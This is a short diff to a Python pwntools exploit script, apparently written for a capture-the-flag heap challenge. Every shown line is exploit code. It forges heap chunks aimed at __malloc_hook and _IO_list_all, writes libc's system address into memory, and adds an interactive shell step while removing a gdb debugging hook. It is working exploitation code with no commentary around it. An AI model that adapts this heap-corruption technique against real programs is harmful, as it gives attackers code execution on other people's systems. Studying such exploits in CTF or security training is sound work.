@@ -39,7 +39,9 @@ print("{:#x}".format(libc_base))
 
 p.recvuntil(">")
 
-alloc(2, 0x40, p64(0) * 3 + p32(0) + p32(1337) + p64(libc_base + libc.symbols["__malloc_hook"] + 0x68))
+alloc(2, 0x48, p64(0) * 3 + p32(0) + p32(1337) + p64(libc_base + libc.symbols["__malloc_hook"] + 0x68) + p64(0) *2 + p64(0)[:6])
+
+p.interactive()
 
 p.sendline("list")
 p.recvuntil("Cell: 1337")
@@ -67,6 +69,5 @@ alloc(3, 0x80, p64(0) * 3 + p64(libc_base + libc.symbols["system"]))
 alloc(2, 0x40, p64(0) * 3 + p32(0) + p32(1337) + p64(0) + p64(0) + p64(0) + p64(libc_base + libc.symbols["_IO_list_all"] - 0x30))
 alloc(0, len(payload), payload)
 
-gdb.attach(p)
 
 p.interactive()
